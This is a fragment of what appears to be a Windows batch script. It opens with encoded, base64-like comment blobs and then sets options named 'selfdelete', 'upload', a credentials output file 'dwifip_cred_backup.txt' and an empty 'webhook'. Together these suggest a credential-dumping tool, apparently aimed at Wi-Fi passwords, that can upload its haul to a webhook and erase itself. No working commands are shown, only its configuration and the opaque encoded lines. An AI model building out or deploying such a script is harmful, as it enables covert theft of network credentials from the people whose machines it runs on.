...
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBdVRRCKAES0A5EO4f7+086IoVgQUewra7P806CmNeIvyUrpeJcj0jdqisQBHA8VTh6+fTMZqH1Ws3a6AcKOoAbuRHSq6UY9GmtwuFPCgyYrdOxYltYQ7Ba77l72kKtBnyHAa4ciOkDK5IhUPN4J+wOkJkzQn9M=
::YB416Ek+ZG8=
::
::
...
set selfdelete=0
set upload=0
set "credsfile=dwifip_cred_backup.txt"
set "webhook="
::
